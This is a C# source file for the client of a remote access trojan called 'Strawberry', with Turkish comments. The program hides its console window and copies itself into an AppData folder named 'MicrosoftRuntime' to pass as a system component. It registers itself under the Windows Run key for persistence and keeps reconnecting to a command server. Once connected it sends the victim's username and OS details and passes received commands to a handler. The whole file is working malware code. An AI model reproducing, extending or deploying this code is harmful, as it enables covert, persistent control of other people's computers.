using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WatsonTcp;
using Strawberry_Client.Baglanti;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace Strawberry_Client
{
    class Program
    {
        public static WatsonTcpClient client = new WatsonTcpClient("127.0.0.1", 31002);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            Thread.Sleep(10000);

            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            yerles();

            eventtanimla();

            baglanmayacalis:

            try
            {
                Console.WriteLine("Bağlanılıyor...");

                //10 sn de bir bağlanmaya çalışıyor

                client.Connect(); //bağlanmaya çalışıyoruz
            }
            catch
            {
                Console.WriteLine("Bağlanılamadı.");
                Thread.Sleep(10000);
                goto baglanmayacalis; //bağlanamayınca geri dönüyoruz
            }

            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
        }

        public static void eventtanimla()
        {
            client.Events.ServerConnected += serverbaglandi;
            client.Events.ServerDisconnected += servergitti;
            client.Events.MessageReceived += mesajgeldi;
        }

        #region Eventler
        
        public static void serverbaglandi(object sender, ConnectionEventArgs args)
        {
            Console.WriteLine("Server'e Bağlanıldı: " + args.IpPort); // bağlanıldı eventi
            
            Ping png = new Ping();
            PingReply prp = png.Send(args.IpPort.Split(':')[0]);

            string pingzamani = "Belirsiz";

            if (prp.Status == IPStatus.Success)
            {
                pingzamani = prp.RoundtripTime.ToString();
            }
            
            client.Send("ekle:" + WindowsIdentity.GetCurrent().Name + ":" + pingzamani + ":" + new ComputerInfo().OSFullName);
        }

        public static void servergitti(object sender, DisconnectionEventArgs args)
        {
            Console.WriteLine("Server Bağlantısı Koptu! Bağlanılmaya Çalışılıyor. Kopma Nedeni: " + args.Reason); //bağlantı kesildi eventi

            baglanmayacalis:

            try
            {
                Console.WriteLine("Bağlanılıyor...");

                client.Connect(); //bağlanmaya çalışıyoruz

                Thread.Sleep(10000); //10 sn de bir bağlanmaya çalışıyor
            }
            catch
            {
                Console.WriteLine("Bağlanılamadı.");
                goto baglanmayacalis; //bağlanamayınca geri dönüyoruz
            }
        }

        public static void mesajgeldi(object sender, MessageReceivedEventArgs args) // mesaj geldi eventi
        {
            Handler.komuthandle(args.Data, args.Metadata);
        }

        #endregion

        #region Araçlar

        public static void SetStartup(string path)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("Strawberry", path);
        }

        public static void yerles()
        {
            Thread.Sleep(10000);

            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            if (Assembly.GetEntryAssembly().Location != Path.Combine(appdata, "MicrosoftRuntime", "Strawberry.exe"))
            {
                if (!File.Exists(Path.Combine(appdata, "MicrosoftRuntime", "Strawberry.exe")))
                {
                    if (!Directory.Exists(Path.Combine(appdata, "MicrosoftRuntime")))
                    {
                        Directory.CreateDirectory(Path.Combine(appdata, "MicrosoftRuntime"));
                    }

                    File.Copy(Assembly.GetEntryAssembly().Location, Path.Combine(appdata, "MicrosoftRuntime", "Strawberry.exe"));

                    SetStartup(Path.Combine(appdata, "MicrosoftRuntime", "Strawberry.exe"));

                    Process.Start(Path.Combine(appdata, "MicrosoftRuntime", "Strawberry.exe"));
                    Environment.Exit(0);
                }
                else
                {
                    Process.Start(Path.Combine(appdata, "MicrosoftRuntime", "Strawberry.exe"));
                    Environment.Exit(0);
                }
            }
            else
            {
                var exists = System.Diagnostics.Process.GetProcessesByName(System.IO.Path.GetFileNameWithoutExtension(System.Reflection.Assembly.GetEntryAssembly().Location)).Count() > 1;

                if (exists)
                {
                    Environment.Exit(0);
                }
            }
        }

        #endregion
    }
}
